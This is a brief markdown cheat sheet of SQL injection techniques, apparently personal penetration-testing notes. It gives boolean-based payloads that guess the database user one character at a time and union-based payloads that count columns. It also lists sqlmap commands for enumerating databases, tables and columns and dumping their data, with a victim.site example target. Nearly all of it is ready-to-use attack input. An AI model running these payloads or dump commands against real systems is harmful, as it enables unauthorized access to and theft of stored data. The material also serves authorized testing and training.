 # SQL Injection
 
### Boolean-based SQL injection
 `' or 1=1`
 
 <br>
 
 
To find current user
```sql
' or substring(user(), 1, 1) = 'a
' or substring(user(), 1, 1) = 'b
.....
```
### Union-based SQL injection

Sample query (complete):
```sql
SELECT name FROM team WHERE id= ' ' UNION SELECT user(); -- -';
```

First, test how many columns are there in the table
```
' UNION SELECT NULL; -- -
' UNION SELECT NULL, NULL; -- -
.....
```
Then we inject something like `' UNION SELECT user(); -- -`

## SQLMap

[cheatsheet](https://dl.packetstormsecurity.net/papers/cheatsheets/sqlmap-cheatsheet-1.0-SDB.pdf)

### Basics
GET
```
$ sqlmap -u <URL> -p <injection param> [options]
# sqlmap -u http://victim.site/login.php?id=3 -p id --technique=U
```

POST
```
$ sqlmap -u <URL> --data=<POST string> -p <injection param> [options]
# sqlmap -u http://victim.site/login.php --data='user=a&pass=a' -p user
```

get database names
```
$ sqlmap -u <URL> --dbs
```

get table names of a specific DB
```
$ sqlmap -u <URL> -D <DB name> --tables
```

get column names of a specific table
```
$ sqlmap -u <URL> -D <DB name> -T <tbl name> --columns
```

get data of specific columns
```
$ sqlmap -u <URL> -D <DB name> -T <tbl name> -C col1,col2 --dump 
```

To use a SQL query to retrieve only specific records (this has been **extremely** helpful when the payload is time-based, because it takes 1-3 seconds to retrieve one letter...) 
```
$ sqlmap -u <URL> --D <db-name> --dump --sql-query=<standard-sql-query>"
# --sql-query="SELECT username, number FROM accounts WHERE username='Kate';"
```

### Flush Session
`--flush-session`

